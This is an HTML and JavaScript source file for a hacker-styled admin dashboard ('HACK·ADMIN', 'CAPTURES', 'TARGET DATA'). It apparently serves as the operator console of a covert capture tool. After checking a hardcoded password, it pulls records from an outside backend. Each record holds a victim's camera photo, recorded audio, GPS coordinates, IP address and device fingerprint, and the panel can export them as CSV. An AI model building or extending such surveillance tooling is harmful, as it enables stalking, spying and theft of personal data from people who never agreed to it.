<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⬛ HACK·ADMIN</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap');
        
        * { margin:0; padding:0; box-sizing:border-box; }
        body {
            font-family: 'Share Tech Mono', monospace;
            background: #0a0a0a;
            color: #00ff41;
            padding: 20px;
            min-height: 100vh;
            display: flex;
            justify-content: center;
        }
        .container { max-width:1400px; width:100%; }
        
        /* ===== LOGIN ===== */
        .login-box {
            background: rgba(10,10,10,0.95);
            border: 2px solid #00ff41;
            border-radius: 15px;
            padding: 44px 32px;
            max-width: 380px;
            margin: 80px auto;
            box-shadow: 0 0 40px rgba(0,255,65,0.1), inset 0 0 40px rgba(0,255,65,0.03);
            text-align: center;
        }
        .login-box h2 {
            font-family: 'Orbitron', monospace;
            font-weight: 400;
            letter-spacing: 4px;
            font-size: 22px;
            color: #00ff41;
            text-shadow: 0 0 20px rgba(0,255,65,0.3);
            margin-bottom: 28px;
        }
        .login-box input {
            width: 100%;
            padding: 14px 20px;
            margin: 14px 0;
            background: #0a0a0a;
            border: 1px solid #00ff41;
            border-radius: 8px;
            color: #00ff41;
            font-size: 16px;
            font-family: inherit;
            outline: none;
            transition: 0.3s;
        }
        .login-box input:focus {
            border-color: #00ff41;
            box-shadow: 0 0 30px rgba(0,255,65,0.1);
        }
        .login-box button {
            width: 100%;
            padding: 14px;
            background: #00ff41;
            color: #000;
            border: none;
            border-radius: 8px;
            font-family: 'Orbitron', monospace;
            font-size: 16px;
            cursor: pointer;
            transition: 0.3s;
            font-weight: bold;
            letter-spacing: 2px;
        }
        .login-box button:hover {
            background: #00cc33;
            box-shadow: 0 0 40px rgba(0,255,65,0.2);
        }
        .login-box .error {
            color: #ff0040;
            margin-top: 18px;
            font-size: 14px;
            text-shadow: 0 0 10px rgba(255,0,64,0.3);
        }
        
        /* ===== HEADER ===== */
        .gallery { display: none; }
        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
            gap: 16px;
            margin-bottom: 30px;
            border-bottom: 1px solid rgba(0,255,65,0.15);
            padding-bottom: 16px;
        }
        header h2 {
            font-family: 'Orbitron', monospace;
            font-weight: 400;
            font-size: 22px;
            color: #00ff41;
            text-shadow: 0 0 20px rgba(0,255,65,0.2);
            letter-spacing: 2px;
        }
        .stats {
            color: rgba(0,255,65,0.5);
            font-size: 14px;
        }
        .stats span {
            color: #00ff41;
            font-size: 28px;
            font-weight: bold;
            text-shadow: 0 0 20px rgba(0,255,65,0.3);
        }
        .header-buttons {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
        }
        .header-buttons button {
            padding: 8px 22px;
            background: transparent;
            border: 1px solid rgba(0,255,65,0.3);
            border-radius: 8px;
            color: #00ff41;
            font-family: 'Share Tech Mono', monospace;
            font-size: 13px;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 1px;
        }
        .header-buttons button:hover {
            background: rgba(0,255,65,0.05);
            border-color: #00ff41;
            box-shadow: 0 0 20px rgba(0,255,65,0.05);
        }
        .header-buttons .logout {
            border-color: rgba(255,0,64,0.3);
            color: #ff0040;
        }
        .header-buttons .logout:hover {
            background: rgba(255,0,64,0.05);
            border-color: #ff0040;
        }
        
        /* ===== GRID ===== */
        .grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(320px, 1fr));
            gap: 20px;
        }
        
        /* ===== CARD ===== */
        .card {
            background: rgba(10,10,10,0.9);
            border: 1px solid rgba(0,255,65,0.12);
            border-radius: 12px;
            overflow: hidden;
            transition: 0.3s;
        }
        .card:hover {
            border-color: rgba(0,255,65,0.3);
            box-shadow: 0 0 30px rgba(0,255,65,0.03);
        }
        
        .card .img-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            min-height: 150px;
            background: #050505;
        }
        .card .img-grid img {
            width: 100%;
            height: 100%;
            min-height: 150px;
            object-fit: cover;
            cursor: pointer;
            border-right: 1px solid rgba(0,255,65,0.08);
        }
        .card .img-grid .badge-loc {
            padding: 12px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            gap: 4px;
            font-size: 12px;
            color: rgba(0,255,65,0.7);
            background: rgba(0,0,0,0.5);
        }
        .badge-loc .glitch {
            font-family: 'Orbitron', monospace;
            font-size: 10px;
            color: rgba(0,255,65,0.3);
            letter-spacing: 2px;
            margin-bottom: 6px;
            text-transform: uppercase;
        }
        .badge-loc .row {
            display: flex;
            align-items: center;
            gap: 6px;
            padding: 2px 0;
        }
        .badge-loc .row .tag {
            opacity: 0.4;
            width: 16px;
            font-size: 12px;
        }
        .badge-loc .row .val {
            color: #00ff41;
            font-weight: 400;
            word-break: break-word;
            font-size: 12px;
        }
        
        .card .info {
            padding: 12px 14px;
            background: rgba(10,10,10,0.8);
        }
        
        /* ===== DETAIL GRID - Only real data ===== */
        .detail-grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 4px 12px;
            font-size: 11px;
            color: rgba(0,255,65,0.6);
        }
        .detail-grid .item {
            display: flex;
            align-items: center;
            gap: 4px;
            padding: 3px 0;
            border-bottom: 1px solid rgba(0,255,65,0.04);
        }
        .detail-grid .item .emoji {
            opacity: 0.5;
            width: 16px;
            font-size: 12px;
        }
        .detail-grid .item .val {
            color: #00ff41;
            font-size: 12px;
        }
        
        .timestamp {
            font-size: 10px;
            color: rgba(0,255,65,0.25);
            margin: 8px 0 10px;
            letter-spacing: 0.5px;
        }
        
        .audio-player {
            margin: 10px 0 8px;
            background: rgba(0,0,0,0.5);
            border-radius: 8px;
            padding: 4px 6px;
            border: 1px solid rgba(0,255,65,0.08);
        }
        .audio-player audio {
            width: 100%;
            height: 30px;
            border-radius: 8px;
            outline: none;
            background: transparent;
        }
        
        .card-actions {
            display: flex;
            gap: 10px;
            margin-top: 6px;
        }
        .delete-btn {
            padding: 5px 16px;
            background: transparent;
            border: 1px solid rgba(255,0,64,0.3);
            border-radius: 6px;
            color: #ff0040;
            font-family: 'Share Tech Mono', monospace;
            font-size: 11px;
            cursor: pointer;
            transition: 0.3s;
            letter-spacing: 0.5px;
        }
        .delete-btn:hover {
            background: rgba(255,0,64,0.05);
            border-color: #ff0040;
        }
        
        .loading, .no-data {
            grid-column: 1 / -1;
            text-align: center;
            padding: 60px 20px;
            color: rgba(0,255,65,0.3);
            font-size: 18px;
            background: rgba(10,10,10,0.5);
            border-radius: 12px;
            border: 1px dashed rgba(0,255,65,0.1);
            letter-spacing: 1px;
        }
        
        /* ===== LIGHTBOX ===== */
        .lightbox {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.95);
            backdrop-filter: blur(10px);
            justify-content: center;
            align-items: center;
            z-index: 9999;
            padding: 30px;
            cursor: pointer;
        }
        .lightbox img {
            max-width: 92%;
            max-height: 88%;
            border-radius: 12px;
            border: 1px solid rgba(0,255,65,0.2);
            box-shadow: 0 0 60px rgba(0,255,65,0.05);
            object-fit: contain;
        }
        .lightbox .close {
            position: absolute;
            top: 25px;
            right: 35px;
            color: #00ff41;
            font-size: 36px;
            cursor: pointer;
            opacity: 0.5;
            transition: 0.3s;
            font-family: 'Orbitron', monospace;
        }
        .lightbox .close:hover { opacity: 1; transform: rotate(90deg); }
        
        @media (max-width: 600px) {
            body { padding: 12px; }
            .login-box { margin: 40px auto; padding: 30px 20px; }
            .grid { grid-template-columns: 1fr; }
            .card .img-grid { grid-template-columns: 1fr 1fr; min-height: 130px; }
            .card .img-grid img { min-height: 120px; }
            .detail-grid { grid-template-columns: 1fr; }
        }
        
        /* Scanline animation */
        .scanline {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff41, transparent);
            opacity: 0.1;
            animation: scan 3s linear infinite;
        }
        @keyframes scan {
            0% { top: 0; opacity: 0.1; }
            50% { top: 100%; opacity: 0.3; }
            100% { top: 0; opacity: 0.1; }
        }
        .card { position: relative; overflow: hidden; }
        .card .scanline { z-index: 2; }
    </style>
</head>
<body>
<div class="container">

    <!-- LIGHTBOX -->
    <div class="lightbox" id="lightbox" onclick="closeLightbox()">
        <span class="close" onclick="event.stopPropagation(); closeLightbox()">✕</span>
        <img id="lightboxImg" src="" alt="preview" />
    </div>

    <!-- LOGIN -->
    <div class="login-box" id="loginBox">
        <div class="scanline"></div>
        <h2>⧩ ADMIN</h2>
        <input type="password" id="passwordInput" placeholder="ENTER PASSWORD" autofocus />
        <button onclick="login()">UNLOCK</button>
        <div class="error" id="loginError"></div>
    </div>

    <!-- GALLERY -->
    <div class="gallery" id="gallery">
        <header>
            <div>
                <h2>⌨ CAPTURES</h2>
                <div class="stats">TOTAL <span id="total">0</span></div>
            </div>
            <div class="header-buttons">
                <button onclick="exportCSV()">⧩ CSV</button>
                <button onclick="loadData()">↻ REFRESH</button>
                <button class="logout" onclick="logout()">⍈ EXIT</button>
            </div>
        </header>
        <div class="grid" id="grid"></div>
    </div>
</div>

<script>
    (function() {
        const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
        const PASSWORD = 'admin123#@!';

        const loginBox = document.getElementById('loginBox');
        const gallery = document.getElementById('gallery');
        const passwordInput = document.getElementById('passwordInput');
        const loginError = document.getElementById('loginError');
        const grid = document.getElementById('grid');
        const totalSpan = document.getElementById('total');
        const lightbox = document.getElementById('lightbox');
        const lightboxImg = document.getElementById('lightboxImg');

        function closeLightbox() {
            lightbox.style.display = 'none';
        }
        window.closeLightbox = closeLightbox;

        function openLightbox(src) {
            if (!src || src === '#') return;
            lightboxImg.src = src;
            lightbox.style.display = 'flex';
        }
        window.openLightbox = openLightbox;

        window.login = function() {
            const pwd = passwordInput.value.trim();
            if (pwd === PASSWORD) {
                loginBox.style.display = 'none';
                gallery.style.display = 'block';
                loginError.textContent = '';
                loadData();
            } else {
                loginError.textContent = '⛔ ACCESS DENIED';
                passwordInput.value = '';
                passwordInput.focus();
            }
        };

        window.logout = function() {
            loginBox.style.display = 'block';
            gallery.style.display = 'none';
            passwordInput.value = '';
            loginError.textContent = '';
            grid.innerHTML = '';
            totalSpan.textContent = '0';
        };

        window.exportCSV = function() {
            window.open(BACKEND_URL + '/api/export-csv', '_blank');
        };

        // ==========================================
        // HACKER UI - REAL DATA ONLY!
        // ==========================================
        window.loadData = async function() {
            grid.innerHTML = '<div class="loading">⏳ LOADING CAPTURES...</div>';
            try {
                const res = await fetch(BACKEND_URL + '/api/admin/get-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: PASSWORD })
                });
                if (!res.ok) throw new Error('HTTP ' + res.status);
                const data = await res.json();
                if (!data.success) {
                    grid.innerHTML = `<div class="no-data">⛔ ${data.message || 'error'}</div>`;
                    return;
                }
                totalSpan.textContent = data.count || 0;
                const items = data.data || [];
                if (items.length === 0) {
                    grid.innerHTML = '<div class="no-data">📭 NO CAPTURES</div>';
                    return;
                }

                grid.innerHTML = '';
                items.forEach(item => {
                    const device = item.fullDeviceInfo || item.deviceDetails || {};
                    const loc = item.location || {};
                    const card = document.createElement('div');
                    card.className = 'card';
                    // Add scanline
                    card.innerHTML = `<div class="scanline"></div>`;
                    
                    const photoSrc = item.userPhoto || item.cameraImage || '#';

                    let audioHtml = '';
                    if (item.audioData && item.audioData !== 'null' && item.audioData.length > 20) {
                        audioHtml = `<div class="audio-player"><audio controls><source src="${item.audioData}" type="audio/webm"></audio></div>`;
                    }

                    // ==========================================
                    // ONLY SHOW REAL DATA - Skip Unknown/Device
                    // ==========================================
                    
                    // Build location badge - only show if data exists
                    let badgeRows = '';
                    if (loc.lat && loc.lng) {
                        badgeRows += `<div class="row"><span class="tag">📍</span> <span class="val">${loc.lat.toFixed(5)}, ${loc.lng.toFixed(5)}</span></div>`;
                    }
                    if (loc.accuracy && loc.accuracy !== 'Unknown' && loc.accuracy !== '—') {
                        badgeRows += `<div class="row"><span class="tag">🎯</span> <span class="val">${loc.accuracy}m</span></div>`;
                    }
                    if (item.ipAddress && item.ipAddress !== 'Unknown' && item.ipAddress !== '—') {
                        badgeRows += `<div class="row"><span class="tag">📡</span> <span class="val">${item.ipAddress}</span></div>`;
                    }
                    
                    // Device info - only show real data
                    let deviceRows = '';
                    if (device.deviceName && device.deviceName !== 'Unknown' && device.deviceName !== '—' && !device.deviceName.includes('Unknown')) {
                        deviceRows += `<div class="row"><span class="tag">📱</span> <span class="val">${device.deviceName}</span></div>`;
                    }
                    if (device.deviceModel && device.deviceModel !== 'Unknown' && device.deviceModel !== '—' && !device.deviceModel.includes('Unknown')) {
                        deviceRows += `<div class="row"><span class="tag">📱</span> <span class="val">${device.deviceModel}</span></div>`;
                    }
                    if (device.manufacturer && device.manufacturer !== 'Unknown' && device.manufacturer !== '—' && !device.manufacturer.includes('Unknown')) {
                        deviceRows += `<div class="row"><span class="tag">🏭</span> <span class="val">${device.manufacturer}</span></div>`;
                    }
                    if (device.os && device.os !== 'Unknown' && device.os !== '—' && !device.os.includes('Unknown')) {
                        let osVal = device.os;
                        if (device.osVersion && device.osVersion !== 'Unknown' && device.osVersion !== '—') {
                            osVal += ' ' + device.osVersion;
                        }
                        deviceRows += `<div class="row"><span class="tag">📲</span> <span class="val">${osVal}</span></div>`;
                    }

                    // Build details grid - only real values
                    let detailsHtml = '';
                    const details = [];
                    
                    if (device.battery?.level && device.battery.level !== 'Unknown' && device.battery.level !== '—') {
                        details.push({ emoji: '🔋', val: device.battery.level });
                    }
                    if (device.connection?.type && device.connection.type !== 'Unknown' && device.connection.type !== '—') {
                        details.push({ emoji: '📶', val: device.connection.type });
                    }
                    if (device.screen?.width && device.screen.height && device.screen.width !== 'Unknown') {
                        details.push({ emoji: '🖥️', val: `${device.screen.width}×${device.screen.height}` });
                    }
                    if (device.memory && device.memory !== 'Unknown' && device.memory !== '—') {
                        details.push({ emoji: '🧠', val: device.memory + 'GB' });
                    }
                    if (device.cores && device.cores !== 'Unknown' && device.cores !== '—') {
                        details.push({ emoji: '⚡', val: device.cores });
                    }
                    if (device.language && device.language !== 'Unknown' && device.language !== '—') {
                        details.push({ emoji: '🌐', val: device.language });
                    }
                    if (device.timezone && device.timezone !== 'Unknown' && device.timezone !== '—') {
                        details.push({ emoji: '🕒', val: device.timezone });
                    }
                    if (device.browserName && device.browserName !== 'Unknown' && device.browserName !== '—') {
                        let browserVal = device.browserName;
                        if (device.browserVersion && device.browserVersion !== 'Unknown' && device.browserVersion !== '—') {
                            browserVal += ' ' + device.browserVersion;
                        }
                        details.push({ emoji: '🌐', val: browserVal });
                    }

                    if (details.length > 0) {
                        detailsHtml = '<div class="detail-grid">';
                        details.forEach(d => {
                            detailsHtml += `<div class="item"><span class="emoji">${d.emoji}</span> <span class="val">${d.val}</span></div>`;
                        });
                        detailsHtml += '</div>';
                    }

                    // If no data at all - show minimal
                    if (!badgeRows && !deviceRows && !detailsHtml) {
                        badgeRows = `<div class="row"><span class="tag">📭</span> <span class="val">No data available</span></div>`;
                    }

                    const badge = `
                        <div class="badge-loc">
                            <div class="glitch">⧩ TARGET DATA</div>
                            ${badgeRows}
                            ${deviceRows}
                        </div>
                    `;

                    const timestamp = item.timestamp ? new Date(item.timestamp).toLocaleString('en-IN', { hour12: true }) : '—';

                    card.innerHTML += `
                        <div class="img-grid">
                            <img src="${photoSrc}" onclick="openLightbox('${photoSrc}')" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 width=%22100%22 height=%22100%22><rect fill=%22%23121f1a%22 width=%22100%22 height=%22100%22/><text x=%2250%22 y=%2258%22 text-anchor=%22middle%22 fill=%22%233a6a4a%22 font-size=%2232%22>📸</text></svg>'" />
                            ${badge}
                        </div>
                        <div class="info">
                            ${detailsHtml}
                            <div class="timestamp">🕐 ${timestamp}</div>
                            ${audioHtml}
                            <div class="card-actions">
                                <button class="delete-btn" onclick="deleteData('${item._id}')">🗑 DELETE</button>
                            </div>
                        </div>
                    `;
                    grid.appendChild(card);
                });
            } catch (err) {
                console.error(err);
                grid.innerHTML = `<div class="no-data">❌ ${err.message || 'network error'}</div>`;
            }
        };

        window.deleteData = async function(id) {
            if (!id || !confirm('DELETE this capture?')) return;
            try {
                const res = await fetch(BACKEND_URL + '/api/admin/delete', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ password: PASSWORD, id })
                });
                const data = await res.json();
                if (data.success) {
                    loadData();
                } else {
                    alert('Error: ' + (data.message || 'unknown'));
                }
            } catch (err) {
                alert('Error: ' + err.message);
            }
        };

        passwordInput.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') window.login();
        });

        document.addEventListener('keydown', (e) => {
            if (e.key === 'Escape') closeLightbox();
        });

        console.log('⧩ HACK ADMIN · backend:', BACKEND_URL);
    })();
</script>
</body>
</html>
